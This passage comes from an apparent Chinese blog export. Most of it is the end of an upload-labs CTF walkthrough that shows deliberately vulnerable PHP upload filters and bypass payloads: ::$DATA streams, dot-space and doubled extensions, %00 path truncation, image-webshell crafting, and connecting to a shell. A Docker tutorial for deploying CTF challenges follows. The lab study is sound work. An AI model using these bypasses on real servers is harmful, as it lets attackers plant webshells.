UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件类型不允许上传！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n**Pass-07与Pass-08代码对比**\n![](https://i.loli.net/2019/07/11/5d269874eb86289062.png)\n对比发现这里删掉了` ::$DATA`的限制\n`::$DATA备用流`存在于每个文件，因此它可以是访问任何文件的替代方法\n所以使用`8.php::$DATA`\n![](https://i.loli.net/2019/07/11/5d269c8c2007e67852.png)\n**Windows :: DATA备用数据流漏洞：**\nhttps://www.owasp.org/index.php/Windows_::DATA_alternate_data_stream\n## Pass-09（点和空格配合绕过）\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //首尾去空\n        \n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件类型不允许上传！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n**Pass-08与Pass-09代码对比**\n![](https://i.loli.net/2019/07/11/5d26a0be9756512346.png)\n对比发现代码后缀名处理的不够严谨, 先去除了文件后面的`.` 再去除了文件后缀的空格, 由于只处理了一次, 所以可以通过上传`9.php. .`虽然有去末尾点和去首尾空格的操作\n但是并不是循环处理的\n所以可以这样构造`9.php. .`\n这样经过一轮处理后，变为`9.php.`\n![](https://i.loli.net/2019/07/11/5d26ac3cd04d742978.png)\n## Pass-10（双后缀名绕过）\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\");\n\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = str_ireplace($deny_ext,\"\", $file_name);\n        $temp_file = $_FILES['upload_file']['tmp_name'];\n        $img_path = UPLOAD_PATH.'/'.$file_name;        \n        if (move_uploaded_file($temp_file, $img_path)) {\n            $is_upload = true;\n        } else {\n            $msg = '上传出错！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n发现关键点\n```php\n$file_name = str_ireplace($deny_ext,\"\", $file_name);\n\n//将文件名（$file_name）中含有黑名单（$deny_ext）的替换为\"\"（删除黑名单字符）\n```\n但是代码并未循环过滤，于是存在`10.pphphp`\n![](https://i.loli.net/2019/07/11/5d26c459dae9d18308.png)\n菜刀连接\n![](https://i.loli.net/2019/07/11/5d26c459b690b50978.png)\ngetshell\n![](https://i.loli.net/2019/07/11/5d26c459c8b8169526.png)\n## Pass-11（%00截断绕过）\n```php\n$is_upload = false;\n$msg = null;\nif(isset($_POST['submit'])){\n    $ext_arr = array('jpg','png','gif');\n    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1);\n    if(in_array($file_ext,$ext_arr)){\n        $temp_file = $_FILES['upload_file']['tmp_name'];\n        $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext;\n\n        if(move_uploaded_file($temp_file,$img_path)){\n            $is_upload = true;\n        } else {\n            $msg = '上传出错！';\n        }\n    } else{\n        $msg = \"只允许上传.jpg|.png|.gif类型文件！\";\n    }\n}\n```\n发现关键点\n```php\n $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext;\n \n 上传文件路径由路径+时间+后缀重新命名\n```\n1.PHP 版本 < 5.3.4\n2.php.ini 中 magic_quotes_gpc=off\n满足上面的条件的时候php就是把%00当成结束符，后面的数据直接忽略\nsave_path可控，因此00截断即可。利用save_path=../upload/11.php%00\n![](https://i.loli.net/2019/07/11/5d26c459c992b49149.png)\n现在貌似成功不了\n## Pass-12（同上%00截断）\n```php\n$is_upload = false;\n$msg = null;\nif(isset($_POST['submit'])){\n    $ext_arr = array('jpg','png','gif');\n    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1);\n    if(in_array($file_ext,$ext_arr)){\n        $temp_file = $_FILES['upload_file']['tmp_name'];\n        $img_path = $_POST['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext;\n\n        if(move_uploaded_file($temp_file,$img_path)){\n            $is_upload = true;\n        } else {\n            $msg = \"上传失败\";\n        }\n    } else {\n        $msg = \"只允许上传.jpg|.png|.gif类型文件！\";\n    }\n}\n```\n**Pass-11与Pass-12代码对比**\n![](https://i.loli.net/2019/07/13/5d294778b4d2086258.png)\n这题跟上一题代码唯一的不同就是`save_path` 从 GET 变成了 POST, 此时不能再使用 %00 截断, 原因是 %00 截断在 GET 中被 url 解码之后是空字符, 但是在 POST 中 %00 不会被 url 解码, 所以只能通过 burpsuite 修改 hex 值为 00 进行截断.\n在upload后面加上12.php+(添加+是为了方便改hex值)\n![](https://i.loli.net/2019/07/13/5d294eff861fc79140.png)\n这里把 2b('+'的 hex) 修改成 00\n![](https://i.loli.net/2019/07/13/5d294f73f2a9189616.png)\n或者直接在upload后面加上`12.php%00`，然后选中%00实施`URL-decode`\n![](https://i.loli.net/2019/07/13/5d29606da9cc397060.png)\n由于环境没配好，所以并没有成功，但是原理是这样的\n网上找的别人成功的图\n\n![](https://i.loli.net/2019/07/13/5d29560c6acab89069.png)\n`$img_path = $_POST['save_path'].\"/\".rand(10,99).date(\"YmdHis\").\".\".$file_ext;` \n其中`\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext;`会被截断\n## Pass-13（图片马）\n```php\nfunction getReailFileType($filename){\n    $file = fopen($filename, \"rb\");\n    $bin = fread($file, 2); //只读2字节\n    fclose($file);\n    $strInfo = @unpack(\"C2chars\", $bin);    \n    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    \n    $fileType = '';    \n    switch($typeCode){      \n        case 255216:            \n            $fileType = 'jpg';\n            break;\n        case 13780:            \n            $fileType = 'png';\n            break;        \n        case 7173:            \n            $fileType = 'gif';\n            break;\n        default:            \n            $fileType = 'unknown';\n        }    \n        return $fileType;\n}\n\n$is_upload = false;\n$msg = null;\nif(isset($_POST['submit'])){\n    $temp_file = $_FILES['upload_file']['tmp_name'];\n    $file_type = getReailFileType($temp_file);\n\n    if($file_type == 'unknown'){\n        $msg = \"文件未知，上传失败！\";\n    }else{\n        $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_type;\n        if(move_uploaded_file($temp_file,$img_path)){\n            $is_upload = true;\n        } else {\n            $msg = \"上传出错！\";\n        }\n    }\n}\n```\n这关主要是利用了一个判断文件的函数\n`fopen`打开文件数据流\n`fread`读取2个字节\n用`unpack`对二进制数据进行解包，`C`代表无符号字节型，后面的2代表个数，也可以用`*`代替\n把两个`chars`连接起来再用`intval`转换为整数型\n做一个图片马就可以绕过\n**图片马制作**\n**方法一：**\n我们需要一张图片`1.jpg `和一句话木马写好的php文件`1.php` \n将1.jpg和1.php放到同一目录下,\n然后在该目录下用cmd执行命令`copy 1.jpg/b + 1.php/a 2.jpg `\n新生成的2.jpg就是我们制作好的图片马\n![](https://i.loli.net/2019/07/13/5d295bd449c1993400.png)\n**方法二**：\nHxD打开一张图片`1.jpg`\n![](https://i.loli.net/2019/07/13/5d295be59cb6829409.png)\n在图片末尾加上一句话木马，保存得到的图片就是图片马了\n![](https://i.loli.net/2019/07/13/5d295c7214fb631104.png)\n## Pass-14（突破exif_imagetype）\n```php\nfunction isImage($filename){\n    $types = '.jpeg|.png|.gif';\n    if(file_exists($filename)){\n        $info = getimagesize($filename);\n        $ext = image_type_to_extension($info[2]);\n        if(stripos($types,$ext)){\n            return $ext;\n        }else{\n            return false;\n        }\n    }else{\n        return false;\n    }\n}\n\n$is_upload = false;\n$msg = null;\nif(isset($_POST['submit'])){\n    $temp_file = $_FILES['upload_file']['tmp_name'];\n    $res = isImage($temp_file);\n    if(!$res){\n        $msg = \"文件未知，上传失败！\";\n    }else{\n        $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").$res;\n        if(move_uploaded_file($temp_file,$img_path)){\n            $is_upload = true;\n        } else {\n            $msg = \"上传出错！\";\n        }\n    }\n}\n```\ngetimagesize判断图片内置函数,所以一样可以使用图片马绕过.可以参考官方文档http://php.net/manual/zh/function.getimagesize.php\n\nimage_type_to_extension取文件后缀的内置函数http://php.net/manual/zh/function.image-type-to-extension.php\n## Pass-15（突破exif_imagetype）\n```php\nfunction isImage($filename){\n    //需要开启php_exif模块\n    $image_type = exif_imagetype($filename);\n    switch ($image_type) {\n        case IMAGETYPE_GIF:\n            return \"gif\";\n            break;\n        case IMAGETYPE_JPEG:\n            return \"jpg\";\n            break;\n        case IMAGETYPE_PNG:\n            return \"png\";\n            break;    \n        default:\n            return false;\n            break;\n    }\n}\n\n$is_upload = false;\n$msg = null;\nif(isset($_POST['submit'])){\n    $temp_file = $_FILES['upload_file']['tmp_name'];\n    $res = isImage($temp_file);\n    if(!$res){\n        $msg = \"文件未知，上传失败！\";\n    }else{\n        $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$res;\n        if(move_uploaded_file($temp_file,$img_path)){\n            $is_upload = true;\n        } else {\n            $msg = \"上传出错！\";\n        }\n    }\n}\n```\nexif_imagetype 也是判断图片的类型的，所以一样可以使用图片马绕过.具体可以看官方文档http://php.net/manual/zh/function.exif-imagetype.php\n## Pass-16（图片二次渲染）\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])){\n    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径\n    $filename = $_FILES['upload_file']['name'];\n    $filetype = $_FILES['upload_file']['type'];\n    $tmpname = $_FILES['upload_file']['tmp_name'];\n\n    $target_path=UPLOAD_PATH.basename($filename);\n\n    // 获得上传文件的扩展名\n    $fileext= substr(strrchr($filename,\".\"),1);\n\n    //判断文件后缀与类型，合法才进行上传操作\n    if(($fileext == \"jpg\") && ($filetype==\"image/jpeg\")){\n        if(move_uploaded_file($tmpname,$target_path))\n        {\n            //使用上传的图片生成新的图片\n            $im = imagecreatefromjpeg($target_path);\n\n            if($im == false){\n                $msg = \"该文件不是jpg格式的图片！\";\n                @unlink($target_path);\n            }else{\n                //给新图片指定文件名\n                srand(time());\n                $newfilename = strval(rand()).\".jpg\";\n                $newimagepath = UPLOAD_PATH.$newfilename;\n                imagejpeg($im,$newimagepath);\n                //显示二次渲染后的图片（使用用户上传图片生成的新图片）\n                $img_path = UPLOAD_PATH.$newfilename;\n                @unlink($target_path);\n                $is_upload = true;\n            }\n        } else {\n            $msg = \"上传出错！\";\n        }\n\n```\n三段代差不多，取其中的一段来分析`$target_path`已经用了`basename`来限制你修改目录绕过的方法了。\n`$fileext`以点为界，取点后面的字符作为后缀名。\n\n变量`$filetype`获取的值取判断`content-type`是否符合条件\n\n`imagecreatefromjpeg`判断是否为图片资源，具体可以看官方文档http://php.net/manual/zh/function.imagecreatefromjpeg.php\n\n`srand(time())`看官方文档http://php.net/manual/zh/function.srand.php，和下面的[strval](http://www.php.net/manual/zh/function.strval.php)`(rand())` 相结合，随机数发生器的初始化，为了让上传的随机文件名不重复。\n`imagecreatefromjpeg`二次渲染它相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染在这个过程中非图像数据的部分直接就隔离开了。\n\n详细绕过方法https://secgeek.net/bookfresh-vulnerability/\n文章中提供的图片马`POC.gif`(在上述链接文章的最后面有)\n![POC.gif](https://i.loli.net/2019/07/14/5d2aa57e5bb1e20848.gif)\n视频绕过演示（翻墙才能看）：https://youtu.be/z-_5a1wyPF0\n\n## Pass-17（条件竞争，大批量发包绕过）\n```php\n$is_upload = false;\n$msg = null;\n\nif(isset($_POST['submit'])){\n    $ext_arr = array('jpg','png','gif');\n    $file_name = $_FILES['upload_file']['name'];\n    $temp_file = $_FILES['upload_file']['tmp_name'];\n    $file_ext = substr($file_name,strrpos($file_name,\".\")+1);\n    $upload_file = UPLOAD_PATH . '/' . $file_name;\n\n    if(move_uploaded_file($temp_file, $upload_file)){\n        if(in_array($file_ext,$ext_arr)){\n             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext;\n             rename($upload_file, $img_path);\n             $is_upload = true;\n        }else{\n            $msg = \"只允许上传.jpg|.png|.gif类型文件！\";\n            unlink($upload_file);\n        }\n    }else{\n        $msg = '上传出错！';\n    }\n}\n```\n通过白名单检测后缀名，符合就rename改名，不符合就unlink删除文件。\n\n\n参考：\n[Upload-labs&amp;Upload Bypass Summarize](https://cloud.tencent.com/developer/article/1377897)\n[Upload-Labs上传绕过](http://www.bubuko.com/infodetail-2944836.html)\n[upload-labs刷关记录](https://blog.csdn.net/u011377996/article/details/86776198)\n[upload-labs WriteUp](http://www.she1don.cn/index.php/archives/38.html)\n[图片木马制作大法](http://gv7.me/articles/2017/picture-trojan-horse-making-method/)\n[upload-labs 通关笔记](https://getpass.cn/2018/11/24/upload-labs/)","tags":["靶场","文件上传"],"categories":["Web"]},{"title":"Docker使用及部署CTF题目","url":"/posts/50751.html","content":"Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的 Linux或Windows 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。\n\n## docker安装\n\n[官方文档](https://docs.docker.com/engine/install/ubuntu/)\n\n```bash\n$ curl -fsSL get.docker.com -o get-docker.sh\n$ sudo sh get-docker.sh --mirror Aliyun\n```\n\n**检验Docker是否安装成功**\n\n```python\n$ docker run hello-world\n\nUnable to find image 'hello-world:latest' locally\n...\nlatest: Pulling from library/hello-world\n1b930d010525: Pull complete \n...\n\nHello from Docker!\nThis message shows that your installation appears to be working correctly.\n...\n```\n\n- 启动docker\n\n  ```python\n  $ service docker start\n  ```\n\n## docker常用命令\n\n- 从镜像仓库中拉取或者更新指定镜像\n```php\ndocker pull [OPTIONS] NAME[:TAG|@DIGEST]\n```\n```php\n    从Docker Hub下载java最新版镜像。\n    docker pull java\n    \n    从Docker Hub下载REPOSITORY为java的所有镜像。\n    docker pull -a java```\n```\n\n- 创建镜像\n```php\ndocker build [options] path | url | - .(最后的点不能丢)\neg：docker build -t warmup .\neg: docker build -f /path/to/a/Dockerfile .\neg: docker build github.com/creack/docker-firefox\n```\n- 新建一个docker容器，并映射端口号。\n```php\ndocker run [options] [host port]:[docker port] [image]\n用到的option： -d 后台运行\n               -P 随机把容器的端口映射到一个主机未使用的高端口\n               -p 格式为主机端口：容器端口 ，自选端口映射\n               -i  以交互模式运行容器，常与-t连用\n               -t  为容器重新分配一个伪输入终端，常与-i连用\neg：docker run -i -d -P warmup \neg: docker run -d -p 100:80 -p 32768:80 warmup\n```\n- 查看本地的docker镜像\n```php\ndocker images 或者 docker image ls\n```\n- 查看正在运行的docker容器。\n```php\ndocker ps\n```\n- 启动/停止一个docker容器。\n```php\ndocker start [container id]\ndocker stop  [container id]\n```\n- 删除一个docker容器。（注意：需要先把容器停止才可以删除。）\n```php\ndocker rm [container id]\n```\n- 容器与主机(服务器，不是自己的PC)之间的数据拷贝\n```php\ndocker cp  dest_path [container id]:container_path ##主机cp到容器\ndocker cp  [container id]:container_path dest_path ##容器cp到主机\n```\n```php\n将主机/www/runoob目录拷贝到容器96f7f14e99ab的/www目录下\ndocker cp /www/runoob 96f7f14e99ab:/www/\n\n 将容器96f7f14e99ab的/www目录拷贝到主机的/tmp目录中\ndocker cp 96f7f14e99ab:/www /tmp/\n\n 将主机/www/runoob目录拷贝到容器96f7f14e99ab中，目录重命名为www\ndocker cp /www/runoob 96f7f14e99ab:/www\n```\n## docker部署CTF题目\n由于要部署web题，所以选择了一个apache-php5\n```php\ndocker pull registry.cn-hangzhou.aliyuncs.com/lxepoo/apache-php5\n```\n然后运行镜像，并绑定一下端口。\n```php\ndocker run -d -p 8085:80 registry.cn-hangzhou.aliyuncs.com/lxepoo/apache-php5\n```\n此时会返回一个值，表示该运行docker的id。以后如果想访问这个容器，需要通过该id。\n也可通过`docker ps `查看正在运行的容器，得到容器id\n\n    然后将本地源码文件拷贝到docker，使用docker的cp命令（在id前几位没有重复的情况下，可以取前几位。）\n```php\ndocker cp ./ f7d233:/var/www/\n```\n- 进入docker容器内部.\n```php\ndocker exec -it f7d233 bash\n\n    -d :分离模式: 在后台运行\n    -i :即使没有附加也保持STDIN 打开\n    -t :分配一个伪终端\n```\n- 退出docker容器内部.\n```php\nCtrl+p+q\n```\n\n\n\n\n参考：\n[菜鸟教程-Docker 命令大全](http://www.runoob.com/docker/docker-tutorial.html)\n[通过docker部署ctf题目 ](http://blog.5am3.com/2017/12/08/SCodeCTF/)\n[记docker复现CTF题的一次流程](https://blog.csdn.net/weixin_40871137/article/details/86609153)\n\n","tags":["docker"],"categories":["Tools"]}]